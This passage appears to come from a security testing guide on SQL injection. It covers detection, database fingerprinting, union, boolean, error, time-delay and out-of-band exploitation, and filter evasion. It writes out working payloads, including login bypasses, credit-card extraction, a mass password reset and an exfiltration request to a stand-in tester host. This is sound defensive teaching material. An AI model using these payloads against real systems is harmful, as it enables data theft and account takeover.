                <p>In general the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:</p>
                
                <p><code class="language-plaintext highlighter-rouge">select title, text from news where id=$id</code></p>
                
                <p>In the example above the variable <code class="language-plaintext highlighter-rouge">$id</code> contains user-supplied data, while the remainder is the SQL static part supplied by the programmer; making the SQL statement dynamic.</p>
                
                <p>Because the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user’s choice. The example below illustrates the user-supplied data “10 or 1=1”, changing the logic of the SQL statement, modifying the WHERE clause adding a condition “or 1=1”.</p>
                
                <p><code class="language-plaintext highlighter-rouge">select title, text from news where id=10 or 1=1</code></p>
                
                <p>SQL Injection attacks can be divided into the following three classes:</p>
                
                <ul>
                  <li>Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.</li>
                  <li>Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).</li>
                  <li>Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.</li>
                </ul>
                
                <p>A successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.</p>
                
                <p>About the techniques to exploit SQL injection flaws there are five commons techniques. Also those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):</p>
                
                <ul>
                  <li>Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.</li>
                  <li>Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.</li>
                  <li>Error based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.</li>
                  <li>Out-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).</li>
                  <li>Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.</li>
                </ul>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify SQL injection points.</li>
                  <li>Assess the severity of the injection and the level of access that can be achieved through it.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="detection-techniques">Detection Techniques</h3>
                
                <p>The first step in this test is to understand when the application interacts with a DB Server in order to access some data. Typical examples of cases when an application needs to talk to a DB include:</p>
                
                <ul>
                  <li>Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).</li>
                  <li>Search engines: the string submitted by the user could be used in a SQL query that extracts all relevant records from a database.</li>
                  <li>E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.</li>
                </ul>
                
                <p>The tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.</p>
                
                <p>The very first test usually consists of adding a single quote <code class="language-plaintext highlighter-rouge">'</code> or a semicolon <code class="language-plaintext highlighter-rouge">;</code> to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error. The output of a vulnerable field might resemble the following (on a Microsoft SQL Server, in this case):</p>
                
                <pre><code class="language-asp">Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
                [Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
                character string ''.
                /target/target.asp, line 113
                </code></pre>
                
                <p>Also comment delimiters (<code class="language-plaintext highlighter-rouge">--</code> or <code class="language-plaintext highlighter-rouge">/* */</code>, etc) and other SQL keywords like <code class="language-plaintext highlighter-rouge">AND</code> and <code class="language-plaintext highlighter-rouge">OR</code> can be used to try to modify the query. A very simple but sometimes still effective technique is simply to insert a string where a number is expected, as an error like the following might be generated:</p>
                
                <pre><code class="language-asp">Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
                [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
                varchar value 'test' to a column of data type int.
                /target/target.asp, line 113
                </code></pre>
                
                <p>Monitor all the responses from the web server and have a look at the HTML/JavaScript source code. Sometimes the error is present inside them but for some reason (e.g. JavaScript error, HTML comments, etc) is not presented to the user. A full error message, like those in the examples, provides a wealth of information to the tester in order to mount a successful injection attack. However, applications often do not provide so much detail: a simple ‘500 Server Error’ or a custom error page might be issued, meaning that we need to use blind injection techniques. In any case, it is very important to test each field separately: only one variable must vary while all the other remain constant, in order to precisely understand which parameters are vulnerable and which are not.</p>
                
                <h3 id="standard-sql-injection-testing">Standard SQL Injection Testing</h3>
                
                <h4 id="classic-sql-injection">Classic SQL Injection</h4>
                
                <p>Consider the following SQL query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM Users WHERE Username='$username' AND Password='$password'</code></p>
                
                <p>A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied. The values of the input fields are generally obtained from the user through a web form. Suppose we insert the following Username and Password values:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$username = 1' or '1' = '1</code></p>
                
                <p><code class="language-plaintext highlighter-rouge">$password = 1' or '1' = '1</code></p>
                
                <p>The query will be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'</code></p>
                
                <p>If we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable web site is www.example.com, the request that we’ll carry out will be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;amp;password=1'%20or%20'1'%20=%20'1</code></p>
                
                <p>After a short analysis we notice that the query returns a value (or a set of values) because the condition is always true (OR 1=1). In this way the system has authenticated the user without knowing the username and password.</p>
                
                <blockquote>
                  <p>In some systems the first row of a user table would be an administrator user. This may be the profile returned in some cases.</p>
                </blockquote>
                
                <p>Another example of query is the following:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))</code></p>
                
                <p>In this case, there are two problems, one due to the use of the parentheses and one due to the use of MD5 hash function. First of all, we resolve the problem of the parentheses. That simply consists of adding a number of closing parentheses until we obtain a corrected query. To resolve the second problem, we try to evade the second condition. We add to our query a final symbol that means that a comment is beginning. In this way, everything that follows such symbol is considered a comment. Every DBMS has its own syntax for comments, however, a common symbol to the greater majority of the databases is <code class="language-plaintext highlighter-rouge">*</code>. In Oracle the symbol is <code class="language-plaintext highlighter-rouge">--</code>. This said, the values that we’ll use as Username and Password are:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$username = 1' or '1' = '1'))/*</code></p>
                
                <p><code class="language-plaintext highlighter-rouge">$password = foo</code></p>
                
                <p>In this way, we’ll get the following query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))</code></p>
                
                <p>(Due to the inclusion of a comment delimiter in the $username value the password portion of the query will be ignored.)</p>
                
                <p>The URL request will be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;amp;password=foo</code></p>
                
                <p>This may return a number of values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). In order to go around this problem, it is enough to insert a SQL command that imposes a condition that the number of the returned results must be one. (One record returned) In order to reach this goal, we use the operator <code class="language-plaintext highlighter-rouge">LIMIT &lt;num&gt;</code>, where <code class="language-plaintext highlighter-rouge">&lt;num&gt;</code> is the number of the results/records that we want to be returned. With respect to the previous example, the value of the fields Username and Password will be modified as follows:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$username = 1' or '1' = '1')) LIMIT 1/*</code></p>
                
                <p><code class="language-plaintext highlighter-rouge">$password = foo</code></p>
                
                <p>In this way, we create a request like the follow:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;amp;password=foo</code></p>
                
                <h4 id="select-statement">SELECT Statement</h4>
                
                <p>Consider the following SQL query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
                
                <p>Consider also the request to a script who executes the query above:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10</code></p>
                
                <p>When the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is play with logic, using the operators AND and OR.</p>
                
                <p>Consider the request:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 AND 1=2</code></p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=10 AND 1=2</code></p>
                
                <p>In this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 AND 1=1</code></p>
                
                <h4 id="stacked-queries">Stacked Queries</h4>
                
                <p>Depending on the API which the web application is using and the DBMS (e.g. PHP + PostgreSQL, ASP+SQL SERVER) it may be possible to execute multiple queries in one call.</p>
                
                <p>Consider the following SQL query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
                
                <p>A way to exploit the above scenario would be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10; INSERT INTO users (…)</code></p>
                
                <p>This way is possible to execute many queries in a row and independent of the first query.</p>
                
                <h3 id="fingerprinting-the-database">Fingerprinting the Database</h3>
                
                <p>Even though the SQL language is a standard, every DBMS has its peculiarity and differs from each other in many aspects like special commands, functions to retrieve data such as users names and databases, features, comments line etc.</p>
                
                <p>When the testers move to a more advanced SQL injection exploitation they need to know what the back end database is.</p>
                
                <h4 id="errors-returned-by-the-application">Errors Returned by the Application</h4>
                
                <p>The first way to find out what back end database is used is by observing the error returned by the application. The following are some examples of error messages:</p>
                
                <p>MySql:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You have an error in your SQL syntax; check the manual
                that corresponds to your MySQL server version for the
                right syntax to use near '\'' at line 1
                </code></pre></div></div>
                
                <p>One complete UNION SELECT with version() can also help to know the back end database.</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1</code></p>
                
                <p>Oracle:</p>
                
                <p><code class="language-plaintext highlighter-rouge">ORA-00933: SQL command not properly ended</code></p>
                
                <p>MS SQL Server:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microsoft SQL Native Client error ‘80040e14’
                Unclosed quotation mark after the character string
                
                SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
                </code></pre></div></div>
                
                <p>PostgreSQL:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Query failed: ERROR: syntax error at or near
                "’" at character 56 in /www/site/test.php on line 121.
                </code></pre></div></div>
                
                <p>If there is no error message or a custom error message, the tester can try to inject into string fields using varying concatenation techniques:</p>
                
                <ul>
                  <li>MySql: ‘test’ + ‘ing’</li>
                  <li>SQL Server: ‘test’ ‘ing’</li>
                  <li>
                    <table>
                      <tbody>
                        <tr>
                          <td>Oracle: ‘test’</td>
                          <td>&nbsp;</td>
                          <td>’ing’</td>
                        </tr>
                      </tbody>
                    </table>
                  </li>
                  <li>
                    <table>
                      <tbody>
                        <tr>
                          <td>PostgreSQL: ‘test’</td>
                          <td>&nbsp;</td>
                          <td>’ing’</td>
                        </tr>
                      </tbody>
                    </table>
                  </li>
                </ul>
                
                <h3 id="exploitation-techniques">Exploitation Techniques</h3>
                
                <h4 id="union-exploitation-technique">Union Exploitation Technique</h4>
                
                <p>The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose for our examples that the query executed from the server is the following:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT Name, Phone, Address FROM Users WHERE Id=$id</code></p>
                
                <p>We will set the following <code class="language-plaintext highlighter-rouge">$id</code> value:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable</code></p>
                
                <p>We will have the following query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable</code></p>
                
                <p>Which will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword <code class="language-plaintext highlighter-rouge">ALL</code> is necessary to get around queries that use the keyword <code class="language-plaintext highlighter-rouge">DISTINCT</code>. Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns in order to avoid a syntax error.</p>
                
                <p>The first detail a tester needs to exploit the SQL injection vulnerability using such technique is to find the right numbers of columns in the SELECT statement.</p>
                
                <p>In order to achieve this the tester can use <code class="language-plaintext highlighter-rouge">ORDER BY</code> clause followed by a number indicating the numeration of database’s column selected:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 ORDER BY 10--</code></p>
                
                <p>If the query executes with success the tester can assume, in this example, there are 10 or more columns in the <code class="language-plaintext highlighter-rouge">SELECT</code> statement. If the query fails then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">Unknown column '10' in 'order clause'</code></p>
                
                <p>After the tester finds out the numbers of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--</code></p>
                
                <p>If the query fails, the tester will probably see a message like:</p>
                
                <p><code class="language-plaintext highlighter-rouge">All cells in a column must have the same datatype</code></p>
                
                <p>If the query executes with success, the first column can be an integer. Then the tester can move further and so on:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--</code></p>
                
                <p>After the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a <code class="language-plaintext highlighter-rouge">LIMIT</code> clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database which ID is 99999):</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--</code></p>
                
                <h4 id="boolean-exploitation-technique">Boolean Exploitation Technique</h4>
                
                <p>The Boolean exploitation technique is very useful when the tester finds a <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">Blind SQL Injection</a> situation, in which nothing is known on the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything on the structure of the query or on the database. (The page does not return a SQL error, it may just return a HTTP 500, 404, or redirect).</p>
                
                <p>By using inference methods, it is possible to avoid this obstacle and thus to succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers and finally deducing the meaning of such answers. We consider, as always, the www.example.com domain and we suppose that it contains a parameter named <code class="language-plaintext highlighter-rouge">id</code> vulnerable to SQL injection. This means that carrying out the following request:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/index.php?id=1'</code></p>
                
                <p>We will get one page with a custom message error which is due to a syntactic error in the query. We suppose that the query executed on the server is:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT field1, field2, field3 FROM Users WHERE Id='$Id'</code></p>
                
                <p>Which is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our examples, we will use the following pseudo-functions:</p>
                
                <ul>
                  <li>
                    <p>SUBSTRING (text, start, length): returns a substring starting from the position “start” of text and of length “length”. If “start” is greater than the length of text, the function returns a null value.</p>
                  </li>
                  <li>
                    <p>ASCII (char): it gives back ASCII value of the input character. A null value is returned if char is 0.</p>
                  </li>
                  <li>
                    <p>LENGTH (text): it gives back the number of characters in the input text.</p>
                  </li>
                </ul>
                
                <p>Through such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, in order to select only one character at a time (selecting a single character means to impose the length parameter to 1), and the function ASCII, in order to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table, until the right value is found. As an example, we will use the following value for <code class="language-plaintext highlighter-rouge">Id</code>:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1</code></p>
                
                <p>That creates the following query (from now on, we will call it “inferential query”):</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'</code></p>
                
                <p>The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set to zero the index of the ASCII table and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for <code class="language-plaintext highlighter-rouge">Id</code>:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$Id=1' AND '1' = '2</code></p>
                
                <p>Which will create the following query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'</code></p>
                
                <p>The obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and to obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates in order to decide the result of the test.</p>
                
                <p>In the previous discussion, we haven’t dealt with the problem of determining the termination condition for out tests, i.e., when we should end the inference procedure. A techniques to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e., the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.</p>
                
                <p>We will insert the following value for the field <code class="language-plaintext highlighter-rouge">Id</code>:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$Id=1' AND LENGTH(username)=N AND '1' = '1</code></p>
                
                <p>Where N is the number of characters that we have analyzed up to now (not counting the null value). The query will be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'</code></p>
                
                <p>The query returns either true or false. If we obtain true, then we have completed the inference and, therefore, we know the value of the parameter. If we obtain false, this means that the null character is present in the value of the parameter, and we must continue to analyze the next parameter until we find another null value.</p>
                
                <p>The blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.</p>
                
                <h4 id="error-based-exploitation-technique">Error Based Exploitation Technique</h4>
                
                <p>An Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL injection vulnerability using other technique such as UNION. The Error based technique consists in forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).</p>
                
                <p>Consider the following SQL query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
                
                <p>Consider also the request to a script who executes the query above:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10</code></p>
                
                <p>The malicious request would be (e.g. Oracle 10g):</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--</code></p>
                
                <p>In this example, the tester is concatenating the value 10 with the result of the function <code class="language-plaintext highlighter-rouge">UTL_INADDR.GET_HOST_NAME</code>. This Oracle function will try to return the hostname of the parameter passed to it, which is other query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:</p>
                
                <p><code class="language-plaintext highlighter-rouge">ORA-292257: host SCOTT unknown</code></p>
                
                <p>Then the tester can manipulate the parameter passed to GET_HOST_NAME() function and the result will be shown in the error message.</p>
                
                <h4 id="out-of-band-exploitation-technique">Out of Band Exploitation Technique</h4>
                
                <p>This technique is very useful when the tester find a <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">Blind SQL Injection</a> situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester’s server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section.</p>
                
                <p>Consider the following SQL query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
                
                <p>Consider also the request to a script who executes the query above:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10</code></p>
                
                <p>The malicious request would be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--</code></p>
                
                <p>In this example, the tester is concatenating the value 10 with the result of the function <code class="language-plaintext highlighter-rouge">UTL_HTTP.request</code>. This Oracle function will try to connect to <code class="language-plaintext highlighter-rouge">testerserver</code> and make a HTTP GET request containing the return from the query <code class="language-plaintext highlighter-rouge">SELECT user FROM DUAL</code>. The tester can set up a webserver (e.g. Apache) or use the Netcat tool:</p>
                
                <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/tester/nc –nLp 80
                
                GET /SCOTT HTTP/1.1
                Host: testerserver.com
                Connection: close
                </code></pre></div></div>
                
                <h4 id="time-delay-exploitation-technique">Time Delay Exploitation Technique</h4>
                
                <p>The time delay exploitation technique is very useful when the tester find a <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">Blind SQL Injection</a> situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).</p>
                
                <p>Consider the following SQL query:</p>
                
                <p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
                
                <p>Consider also the request to a script who executes the query above:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10</code></p>
                
                <p>The malicious request would be (e.g. MySql 5.x):</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--</code></p>
                
                <p>In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.</p>
                
                <h4 id="stored-procedure-injection">Stored Procedure Injection</h4>
                
                <p>When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.</p>
                
                <p>Consider the following SQL Server Stored Procedure:</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Create</span> <span class="k">procedure</span> <span class="n">user_login</span> <span class="o"></span><span class="n">username</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="o"></span><span class="n">passwd</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
                <span class="k">As</span>
                <span class="k">Declare</span> <span class="o"></span><span class="n">sqlstring</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">250</span><span class="p">)</span>
                <span class="k">Set</span> <span class="o"></span><span class="n">sqlstring</span>  <span class="o">=</span> <span class="err">‘</span>
                <span class="k">Select</span> <span class="mi">1</span> <span class="k">from</span> <span class="n">users</span>
                <span class="k">Where</span> <span class="n">username</span> <span class="o">=</span> <span class="err">‘</span> <span class="o">+</span> <span class="o"></span><span class="n">username</span> <span class="o">+</span> <span class="err">‘</span> <span class="k">and</span> <span class="n">passwd</span> <span class="o">=</span> <span class="err">‘</span> <span class="o">+</span> <span class="o"></span><span class="n">passwd</span>
                <span class="k">exec</span><span class="p">(</span><span class="o"></span><span class="n">sqlstring</span><span class="p">)</span>
                <span class="k">Go</span>
                </code></pre></div></div>
                
                <p>User input:</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">anyusername</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="s1">'
                anypassword
                </span></code></pre></div></div>
                
                <p>This procedure does not sanitize the input, therefore allowing the return value to show an existing record with these parameters.</p>
                
                <blockquote>
                  <p>This example may seem unlikely due to the use of dynamic SQL to log in a user, but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.</p>
                </blockquote>
                
                <p>Consider the following SQL Server Stored Procedure:</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Create</span>
                <span class="k">procedure</span> <span class="n">get_report</span> <span class="o"></span><span class="n">columnamelist</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">7900</span><span class="p">)</span>
                <span class="k">As</span>
                <span class="k">Declare</span> <span class="o"></span><span class="n">sqlstring</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">)</span>
                <span class="k">Set</span> <span class="o"></span><span class="n">sqlstring</span>  <span class="o">=</span> <span class="err">‘</span>
                <span class="k">Select</span> <span class="err">‘</span> <span class="o">+</span> <span class="o"></span><span class="n">columnamelist</span> <span class="o">+</span> <span class="err">‘</span> <span class="k">from</span> <span class="n">ReportTable</span><span class="err">‘</span>
                <span class="k">exec</span><span class="p">(</span><span class="o"></span><span class="n">sqlstring</span><span class="p">)</span>
                <span class="k">Go</span>
                </code></pre></div></div>
                
                <p>User input:</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span> <span class="k">update</span> <span class="n">users</span> <span class="k">set</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'password'</span><span class="p">;</span> <span class="k">select</span> <span class="o">*</span>
                </code></pre></div></div>
                
                <p>This will result in the report running and all users’ passwords being updated.</p>
                
                <h4 id="automated-exploitation">Automated Exploitation</h4>
                
                <p>Most of the situation and techniques presented here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using <a href="https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap">SQLMap</a></p>
                
                <h3 id="sql-injection-signature-evasion-techniques">SQL Injection Signature Evasion Techniques</h3>
                
                <p>The techniques are used to bypass defenses such as Web application firewalls (WAFs) or intrusion prevention systems (IPSs). Also refer to <a href="https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF">https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF</a></p>
                
                <h4 id="whitespace">Whitespace</h4>
                
                <p>Dropping space or adding spaces that won’t affect the SQL statement. For example</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">or</span> <span class="s1">'a'</span><span class="o">=</span><span class="s1">'a'</span>
                
                <span class="k">or</span> <span class="s1">'a'</span>  <span class="o">=</span>    <span class="s1">'a'</span>
                </code></pre></div></div>
                
                <p>Adding special character like new line or tab that won’t change the SQL statement execution. For example,</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">or</span>
                <span class="s1">'a'</span><span class="o">=</span>
                        <span class="s1">'a'</span>
                </code></pre></div></div>
                
                <h4 id="null-bytes">Null Bytes</h4>
                
                <p>Use null byte (%00) prior to any characters that the filter is blocking.</p>
                
                <p>For example, if the attacker may inject the following SQL</p>
                
                <p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE username='admin'--</code></p>
                
                <p>to add Null Bytes will be</p>
                
                <p><code class="language-plaintext highlighter-rouge">%00' UNION SELECT password FROM Users WHERE username='admin'--</code></p>
                
                <h4 id="sql-comments">SQL Comments</h4>
                
                <p>Adding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as example.</p>
                
                <p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE name='admin'--</code></p>
                
                <p>Adding SQL inline comments will be.</p>
                
                <p><code class="language-plaintext highlighter-rouge">'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--</code></p>
                
                <p><code class="language-plaintext highlighter-rouge">'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--</code></p>
                
                <h4 id="url-encoding">URL Encoding</h4>
                
                <p>Use the <a href="https://meyerweb.com/eric/tools/dencoder/">online URL encoding</a> to encode the SQL statement</p>
                
                <p><code class="language-plaintext highlighter-rouge">' UNION SELECT password FROM Users WHERE name='admin'--</code></p>
                
                <p>The URL encoding of the SQL injection statement will be</p>
                
